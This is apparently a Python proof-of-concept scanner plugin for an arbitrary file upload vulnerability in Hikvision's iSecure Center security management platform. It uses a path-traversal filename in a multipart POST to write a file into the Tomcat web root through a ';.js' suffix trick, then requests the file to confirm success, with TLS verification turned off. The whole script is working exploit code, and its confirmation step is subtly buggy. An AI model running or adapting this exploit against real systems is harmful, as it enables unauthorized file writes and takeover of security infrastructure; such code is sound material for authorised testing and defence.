#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/4An-tUll11dBVozyYKxTfg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '海康威视isecure center 综合安防管理平台 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c',
      }
  target = '/clusterMgr/836424300.txt;.js'
  data = '''
--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"
Content-Type: application/octet-stream

7758758123
--ea26cdac4990498b32d7a95ce5a5135c--
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'code.*?data.*?filename.*?clusterMgr.*?txt.*?',res.text,re.S):
      fname = re.search(r'clusterMgr.*?txt',res.text,re.S).group()[0]
      fileurl = url+'/'+fname+';.js'
      resp = requests.get(url=fileurl,headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and '7758758123' in res.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret